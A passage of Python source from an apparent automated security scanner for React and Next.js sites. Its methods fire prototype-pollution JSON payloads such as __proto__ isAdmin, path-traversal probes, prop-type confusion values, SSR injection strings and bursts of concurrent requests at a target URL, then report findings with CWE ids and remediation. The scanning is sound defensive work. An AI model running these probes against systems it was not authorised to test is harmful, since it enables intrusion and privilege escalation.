        Probe for race conditions in async useEffect by sending rapid
        concurrent requests to state-modifying endpoints.
        """
        findings: list[Finding] = []

        # Find API endpoints from network log
        network_log = page_data.get("network_log", [])
        api_endpoints: list[str] = []

        for entry in network_log:
            entry_url = entry.get("url", "")
            if any(pattern in entry_url for pattern in ["/api/", "/graphql", "/rest/", "/_next/data"]):
                api_endpoints.append(entry_url)

        if not api_endpoints:
            return findings

        async with httpx.AsyncClient(
            timeout=15.0,
            verify=self.config.verify_ssl,
        ) as client:
            # Test first 3 API endpoints
            for endpoint in api_endpoints[:3]:
                try:
                    # Send 10 concurrent requests
                    tasks = [
                        client.get(
                            endpoint,
                            headers={
                                "User-Agent": self.config.user_agent,
                                "X-Race-Test": str(i),
                            },
                        )
                        for i in range(10)
                    ]

                    start_time = time.perf_counter()
                    responses = await asyncio.gather(*tasks, return_exceptions=True)
                    elapsed = time.perf_counter() - start_time

                    # Analyze responses for race condition indicators
                    status_codes = [
                        r.status_code for r in responses if isinstance(r, httpx.Response)
                    ]
                    unique_statuses = set(status_codes)

                    # Check for inconsistent responses (race condition indicator)
                    response_bodies: list[str] = []
                    for r in responses:
                        if isinstance(r, httpx.Response):
                            response_bodies.append(safe_response_text(r)[:200])

                    unique_bodies = len(set(response_bodies))

                    # Race condition indicators:
                    # 1. Mixed status codes (some 200, some 409/500)
                    # 2. Different response bodies for same request
                    # 3. Error responses mentioning concurrency
                    race_indicators: list[str] = []

                    if len(unique_statuses) > 1:
                        race_indicators.append(f"Mixed status codes: {unique_statuses}")

                    if unique_bodies > 1 and unique_bodies < len(response_bodies):
                        race_indicators.append(f"Inconsistent responses: {unique_bodies} variants")

                    error_keywords = ["concurrent", "race", "conflict", "retry", "deadlock"]
                    for body in response_bodies:
                        if any(kw in body.lower() for kw in error_keywords):
                            race_indicators.append("Concurrency error message detected")
                            break

                    if race_indicators:
                        findings.append(
                            self._create_finding(
                                severity="MEDIUM",
                                title="useEffect Race Condition Detected",
                                description=(
                                    f"Potential race condition detected in API endpoint. "
                                    f"Indicators: {'; '.join(race_indicators)}. "
                                    "Rapid concurrent requests produced inconsistent results, "
                                    "suggesting the endpoint or associated React component "
                                    "may have race condition vulnerabilities in async state handling."
                                ),
                                cwe_id="CWE-362",
                                cwe_name="Concurrent Execution using Shared Resource with Improper Synchronization",
                                url=endpoint,
                                evidence=(
                                    f"Endpoint: {endpoint}\n"
                                    f"Concurrent requests: 10\n"
                                    f"Elapsed time: {elapsed:.3f}s\n"
                                    f"Status codes: {status_codes}\n"
                                    f"Unique responses: {unique_bodies}"
                                ),
                                remediation=(
                                    "Implement proper cleanup in useEffect to cancel pending requests: "
                                    "useEffect(() => { let cancelled = false; ... return () => cancelled = true; }, []). "
                                    "Use AbortController for fetch requests. "
                                    "Implement optimistic locking on server side. "
                                    "Consider using React Query or SWR for data fetching."
                                ),
                                cvss_score=5.9,
                                references=[
                                    "https://react.dev/reference/react/useEffect#fetching-data-with-effects",
                                    "https://cwe.mitre.org/data/definitions/362.html",
                                ],
                                metadata={
                                    "endpoint": endpoint,
                                    "indicators": race_indicators,
                                    "status_codes": list(unique_statuses),
                                },
                            )
                        )
                        break

                except Exception as e:
                    logger.debug("race_condition_test_error", endpoint=endpoint, error=str(e))
                    continue

        return findings

    async def _attack_context_provider_override(
        self,
        url: str,
        page_data: dict[str, Any],
    ) -> list[Finding]:
        """
        Attack 7: Context Provider Override via Prototype Pollution.

        Test if React context can be polluted via Object prototype pollution,
        potentially overriding context values application-wide.
        """
        findings: list[Finding] = []

        pollution_payloads = [
            {"__proto__": {"isAdmin": True}},
            {"constructor": {"prototype": {"isAuthenticated": True}}},
            {"__proto__": {"role": "admin"}},
            {"constructor": {"prototype": {"permissions": ["*"]}}},
        ]

        async with httpx.AsyncClient(
            timeout=15.0,
            verify=self.config.verify_ssl,
        ) as client:
            for payload in pollution_payloads:
                try:
                    # Test via JSON body
                    response = await client.post(
                        url,
                        json=payload,
                        headers={
                            "User-Agent": self.config.user_agent,
                            "Content-Type": "application/json",
                        },
                    )

                    # Check for prototype pollution indicators
                    response_text = safe_response_text(response).lower()

                    # Signs of successful pollution or vulnerable handling
                    pollution_indicators = [
                        "isadmin",
                        "isauthenticated",
                        "role.*admin",
                        "permissions",
                        "__proto__",
                        "prototype pollution",
                        "object.prototype",
                    ]

                    if any(re.search(ind, response_text) for ind in pollution_indicators):
                        findings.append(
                            self._create_finding(
                                severity="HIGH",
                                title="Prototype Pollution Affecting React Context",
                                description=(
                                    "Server processed prototype pollution payload without sanitization. "
                                    "This could allow attackers to pollute Object.prototype, "
                                    "potentially affecting React context providers and overriding "
                                    "authentication or authorization states application-wide."
                                ),
                                cwe_id="CWE-1321",
                                cwe_name="Improperly Controlled Modification of Object Prototype Attributes",
                                url=url,
                                evidence=f"Payload: {json.dumps(payload)}\nResponse indicators found",
                                remediation=(
                                    "Sanitize JSON input to reject __proto__ and constructor keys. "
                                    "Use Object.create(null) for object storage. "
                                    "Freeze Object.prototype in application initialization. "
                                    "Use Map instead of plain objects for dynamic keys."
                                ),
                                cvss_score=8.1,
                                references=[
                                    "https://cwe.mitre.org/data/definitions/1321.html",
                                    "https://portswigger.net/web-security/prototype-pollution",
                                ],
                                metadata={"payload": payload},
                            )
                        )
                        return findings

                except Exception as e:
                    logger.debug("context_pollution_test_error", error=str(e))
                    continue

        return findings

    async def _attack_router_path_traversal(
        self,
        url: str,
        page_data: dict[str, Any],
    ) -> list[Finding]:
        """
        Attack 10: React Router Path Traversal.

        Test dynamic route params for path traversal attacks that could
        access unauthorized routes or resources.
        """
        findings: list[Finding] = []
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"

        # Detect dynamic route patterns
        path_segments = parsed.path.strip("/").split("/")
        dynamic_patterns: list[int] = []

        for i, segment in enumerate(path_segments):
            # Look for patterns that might be dynamic (IDs, slugs, etc.)
            if re.match(r"^[0-9]+$", segment) or re.match(r"^[a-f0-9-]{8,}$", segment):
                dynamic_patterns.append(i)

        if not dynamic_patterns:
            # Try common dynamic route patterns
            test_paths = ["/user/", "/post/", "/item/", "/page/", "/article/"]
        else:
            test_paths = [parsed.path]

        async with httpx.AsyncClient(
            timeout=15.0,
            verify=self.config.verify_ssl,
            follow_redirects=False,  # Important: don't follow to detect traversal
        ) as client:
            for test_path in test_paths:
                for payload, description in self.PATH_TRAVERSAL_PAYLOADS:
                    # Construct traversal URL
                    if dynamic_patterns and test_path == parsed.path:
                        segments = path_segments.copy()
                        segments[dynamic_patterns[0]] = payload
                        traversal_path = "/" + "/".join(segments)
                    else:
                        traversal_path = test_path + payload

                    test_url = f"{base_url}{traversal_path}"

                    try:
                        response = await client.get(
                            test_url,
                            headers={"User-Agent": self.config.user_agent},
                        )

                        # Success indicators for path traversal
                        traversal_success = False
                        evidence_details: list[str] = []

                        # Check if we reached admin or sensitive content
                        if response.status_code == 200:
                            response_text = safe_response_text(response).lower()

                            admin_indicators = [
                                "admin",
                                "dashboard",
                                "management",
                                "settings",
                                "configuration",
                                "users list",
                                "user management",
                            ]

                            if any(ind in response_text for ind in admin_indicators):
                                traversal_success = True
                                evidence_details.append("Admin content detected")

                        # Check for redirect to admin area
                        if response.status_code in (301, 302, 307, 308):
                            location = response.headers.get("location", "")
                            if "admin" in location.lower():
                                traversal_success = True
                                evidence_details.append(f"Redirect to admin: {location}")

                        if traversal_success:
                            findings.append(
                                self._create_finding(
                                    severity="HIGH",
                                    title="React Router Path Traversal",
                                    description=(
                                        f"Path traversal vulnerability in React Router. "
                                        f"Technique: {description}. "
                                        f"Evidence: {'; '.join(evidence_details)}. "
                                        "Dynamic route parameters allowed path traversal sequences, "
                                        "potentially granting access to unauthorized routes."
                                    ),
                                    cwe_id="CWE-22",
                                    cwe_name="Improper Limitation of a Pathname to a Restricted Directory",
                                    url=test_url,
                                    evidence=(
                                        f"Payload: {payload}\n"
                                        f"URL: {test_url}\n"
                                        f"Status: {response.status_code}\n"
                                        f"Details: {evidence_details}"
                                    ),
                                    remediation=(
                                        "Validate and sanitize all route parameters. "
                                        "Use allowlist for expected parameter formats. "
                                        "Implement path normalization before routing. "
                                        "Use React Router's built-in param validation. "
                                        "Block encoded traversal sequences (../, %2e%2e/)."
                                    ),
                                    cvss_score=7.5,
                                    references=[
                                        "https://reactrouter.com/en/main/route/route#dynamic-segments",
                                        "https://cwe.mitre.org/data/definitions/22.html",
                                    ],
                                    metadata={
                                        "payload": payload,
                                        "description": description,
                                        "test_url": test_url,
                                    },
                                )
                            )
                            return findings

                    except Exception as e:
                        logger.debug("path_traversal_test_error", url=test_url, error=str(e))
                        continue

        return findings

    async def _attack_prop_type_confusion(
        self,
        url: str,
        page_data: dict[str, Any],
    ) -> list[Finding]:
        """
        Attack 11: Prop Type Confusion.

        Send wrong types to props expecting specific types to find
        unhandled type errors that could crash or expose information.
        """
        findings: list[Finding] = []

        async with httpx.AsyncClient(
            timeout=15.0,
            verify=self.config.verify_ssl,
        ) as client:
            for prop_name, confused_value, description in self.PROP_TYPE_CONFUSION:
                try:
                    # Test via JSON API
                    payload = {prop_name: confused_value}

                    response = await client.post(
                        url,
                        json=payload,
                        headers={
                            "User-Agent": self.config.user_agent,
                            "Content-Type": "application/json",
                        },
                    )

                    response_text = safe_response_text(response).lower()

                    # Check for type error indicators
                    type_error_indicators = [
                        "typeerror",
                        "cannot read propert",
                        "is not a function",
                        "undefined is not",
                        "null is not",
                        "expected a",
                        "invalid prop",
                        "failed prop type",
                        "proptype",
                        "invariant violation",
                        "maximum call stack",
                        "stack overflow",
                    ]

                    if any(ind in response_text for ind in type_error_indicators):
                        findings.append(
                            self._create_finding(
                                severity="MEDIUM",
                                title="Prop Type Confusion Error",
                                description=(
                                    f"Type confusion attack triggered error response. "
                                    f"Attack: {description}. "
                                    "The application does not properly validate prop types, "
                                    "allowing attackers to cause crashes or unexpected behavior "
                                    "by sending malformed data types."
                                ),
                                cwe_id="CWE-843",
                                cwe_name="Access of Resource Using Incompatible Type",
                                url=url,
                                evidence=(
                                    f"Payload: {json.dumps(payload)}\n"
                                    f"Description: {description}\n"
                                    f"Status: {response.status_code}"
                                ),
                                remediation=(
                                    "Use TypeScript for compile-time type checking. "
                                    "Implement runtime validation with PropTypes or Zod. "
                                    "Add error boundaries to catch and handle type errors gracefully. "
                                    "Validate all external input against expected schemas."
                                ),
                                cvss_score=5.3,
                                references=[
                                    "https://react.dev/reference/react/Component#static-proptypes",
                                    "https://cwe.mitre.org/data/definitions/843.html",
                                ],
                                metadata={
                                    "prop_name": prop_name,
                                    "description": description,
                                },
                            )
                        )
                        return findings

                except Exception as e:
                    logger.debug("type_confusion_test_error", error=str(e))
                    continue

        return findings

    async def _attack_ssr_injection(
        self,
        url: str,
        page_data: dict[str, Any],
    ) -> list[Finding]:
        """
        Attack 12: SSR Injection Points.

        Find server-side rendering injection via meta tags, title,
        and Open Graph properties.
        """
        findings: list[Finding] = []
        parsed = urlparse(url)

        async with httpx.AsyncClient(
            timeout=15.0,
            verify=self.config.verify_ssl,
            follow_redirects=True,
        ) as client:
            for payload, target, description in self.SSR_INJECTION_PAYLOADS[:5]:
                # Test via URL parameter
                test_params = {
                    "title": payload,
                    "description": payload,
                    "name": payload,
                    "q": payload,
                    "search": payload,
                }

                for param_name, param_value in test_params.items():
                    test_url = f"{url}?{param_name}={param_value}"

                    try:
                        response = await client.get(
                            test_url,
                            headers={"User-Agent": self.config.user_agent},
                        )

                        # Check if payload is reflected in SSR-specific locations
                        ssr_reflection_patterns = [
                            rf"<title[^>]*>[^<]*{re.escape(payload[:20])}",
                            rf'<meta[^>]*content\s*=\s*["\'][^"\']*{re.escape(payload[:20])}',
                            rf'<meta[^>]*property\s*=\s*["\']og:[^"\']*[^>]*content\s*=\s*["\'][^"\']*{re.escape(payload[:20])}',
                            rf"__html[\"']?\s*:\s*[\"'][^\"']*{re.escape(payload[:20])}",
                        ]

                        for pattern in ssr_reflection_patterns:
                            if re.search(pattern, safe_response_text(response), re.IGNORECASE):
                                findings.append(
                                    self._create_finding(
                                        severity="HIGH",
                                        title=f"SSR Injection in {target}",
                                        description=(
                                            f"Server-side rendering injection vulnerability. "
                                            f"Attack type: {description}. "
                                            f"User input reflected in {target} without sanitization. "
                                            "SSR injection can lead to XSS that executes before "
                                            "React hydration, bypassing client-side protections."
                                        ),
                                        cwe_id="CWE-79",
                                        cwe_name="Improper Neutralization of Input During Web Page Generation",
                                        url=test_url,
                                        evidence=(
                                            f"Payload: {payload[:50]}\n"
                                            f"Target: {target}\n"
                                            f"Parameter: {param_name}\n"
                                            f"Pattern: {pattern[:50]}"
                                        ),
                                        remediation=(
                                            "Sanitize all user input before including in SSR output. "
                                            "Use framework-specific escaping (e.g., Next.js escapeHtml). "
                                            "Implement strict CSP headers. "
                                            "Validate and encode meta tag values. "
                                            "Use allowlist for Open Graph property values."
                                        ),
                                        cvss_score=7.1,
                                        references=[
                                            "https://nextjs.org/docs/pages/building-your-application/optimizing/open-telemetry",
                                            "https://cwe.mitre.org/data/definitions/79.html",
                                        ],
                                        metadata={
                                            "payload": payload[:50],
                                            "target": target,
                                            "parameter": param_name,
                                        },
                                    )
                                )
                                return findings

                    except Exception as e:
                        logger.debug("ssr_injection_test_error", url=test_url, error=str(e))
                        continue

        return findings
